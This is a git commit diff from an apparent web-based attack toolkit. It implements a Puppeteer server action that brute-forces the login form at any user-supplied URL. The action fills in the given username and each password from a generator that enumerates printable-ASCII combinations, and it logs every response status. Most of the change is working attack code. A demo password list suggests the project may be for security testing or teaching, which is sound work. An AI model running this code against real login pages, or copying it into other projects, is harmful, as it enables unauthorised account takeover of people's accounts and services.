fe53f9334dbfa47ab69a3571a01632e3c489cc6e
Irina Dimova <irinadimova82@gmail.com>
2024-10-19 18:25:29 +0300

    Implement brute-force request response interception

--- src/app/(attacks)/brute-force/actions.ts
+++ src/app/(attacks)/brute-force/actions.ts
@@ -1,36 +1,62 @@
 "use server";
 
 import puppeteer from "puppeteer";
-import {
-  bruteForceSchema,
-  BruteForceSchema,
-} from "./models/brute-force-schema.model";
+import { BruteForceSchema } from "./models/brute-force-schema.model";
 import { generatePasswords } from "./utils/generate-passwords.util";
 
 export async function submitBruteForceForm(data: BruteForceSchema) {
   const browser = await puppeteer.launch({
-    headless: true,
+    headless: false,
   });
-  const page = await browser.newPage();
+  const pages = await browser.pages();
+  const page = pages[0];
 
   // Navigate the page to a URL
   await page.goto(data.url, { waitUntil: "networkidle0" });
   await page.waitForSelector(data.loginFieldSelector);
 
-  let passwords = generatePasswords();
+  const passwords = generatePasswords();
+
   const responses = [];
 
   for (const password of passwords) {
+    if (page.url() !== data.url) {
+      break;
+    }
+
     await page.locator(data.loginFieldSelector).fill(data.loginName);
     await page.locator(data.passwordFieldSelector).fill(password);
-    await page.locator(data.loginButtonSelector).click();
 
-    await page.waitForResponse((response) => response.status() === 200);
+    page.locator(data.loginButtonSelector).click();
+
+    const request = await page.waitForRequest((request) => {
+      const postData = request.postData();
+
+      if (postData) {
+        return (
+          postData.includes(encodeURIComponent(data.loginName)) &&
+          postData.includes(encodeURIComponent(password))
+        );
+      }
+
+      return (
+        request.url().includes(encodeURIComponent(data.loginName)) &&
+        request.url().includes(encodeURIComponent(password))
+      );
+    });
+
+    const response = await page.waitForResponse(
+      (response) => response.url() === request.url()
+    );
+
+    responses.push({
+      login: data.loginName,
+      password,
+      statusCode: response.status(),
+    });
   }
-
-  const content = await page.content();
 
   await browser.close();
 
-  return { content };
+  return { responses };
 }
--- src/app/(attacks)/brute-force/utils/generate-passwords.util.ts
+++ src/app/(attacks)/brute-force/utils/generate-passwords.util.ts
@@ -1,11 +1,26 @@
 import { generateCombinations } from "./generate-combinations.utils";
 
 export function generatePasswords() {
-  const chars =
-    //[" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"];
-    ["t", "e", "s"];
+  if (process.env.BRUTE_FORCE_DEMO_DATA) {
+    return [
+      "asdfsas",
+      "djdjdjd",
+      "udsguef",
+      "378rb33rf0",
+      "nd83er3OJ0",
+      "ewfdj932J8WD9",
+      "admin", // correct pass
+      "fenw903Js-",
+      "US8ehg0D",
+      "eoif8G7i",
+    ];
+  }
+
+  const chars = [
+    " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~",
+  ];
   const startLen = 8;
-  const stopLen = 8; // Math.floor(Math.random() * 20);
+  const stopLen = Math.floor(Math.random() * 20);
   const passwords = generateCombinations(chars, startLen, stopLen);
 
   return passwords;
